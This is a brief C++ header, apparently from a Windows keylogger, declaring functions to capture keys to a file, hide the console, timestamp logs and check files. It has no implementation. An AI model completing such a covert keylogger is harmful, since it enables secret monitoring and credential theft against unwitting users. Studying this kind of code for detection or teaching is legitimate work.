#pragma once
#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <ctime>
#include <chrono>

/*
*	Global DEBUG variable for testing and debugging
*/
bool DEBUG = false;

void captureKey(int key, std::string filename);
void hideConsole();
void createFileHeader(std::string filename);
void createTimeStamp(std::string filename);
bool fileExists(std::string filename);